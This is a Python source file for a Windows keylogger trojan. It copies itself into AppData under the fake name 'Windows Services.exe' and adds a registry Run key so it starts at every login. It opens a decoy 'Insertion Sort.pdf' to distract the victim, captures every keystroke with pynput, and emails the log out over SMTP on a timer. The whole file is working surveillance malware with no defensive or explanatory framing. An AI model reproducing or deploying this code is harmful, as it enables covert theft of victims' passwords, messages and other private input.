import subprocess
import smtplib
import string
import threading
import pynput
import os
import shutil
import sys

class Keylogger:
    
    def __init__(self, email, password):
        self.become_persistent()
        self.log = "Keylogger started "
        self.email = email
        self.password = password
    

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Services.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"',shell = True)


    def append_to_log(self, string):
        self.log += string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)


    def report(self):
        self.send_mail(self.email, self.password, "\n\n" +self.log)
        self.log = ""
        timer = threading.Timer(25200, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        sender = "<from@example.com>"
        receiver = "<to@example.com>"
        
        server = smtplib.SMTP("smtp.mailtrap.io", 2525)
        server.starttls()
        server.login(email, password)
        server.sendmail(sender, receiver, message)
        server.quit()


    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press= self.process_key_press)
        with keyboard_listener:
            self.report() 
            keyboard_listener.join()


file_name = sys.MEIPASS + "\Insertion Sort.pdf"
subprocess.Popen(file_name, shell = True)


n = Keylogger("YOUR_USERNAME", "YOUR_PASSWORD")
n.start()


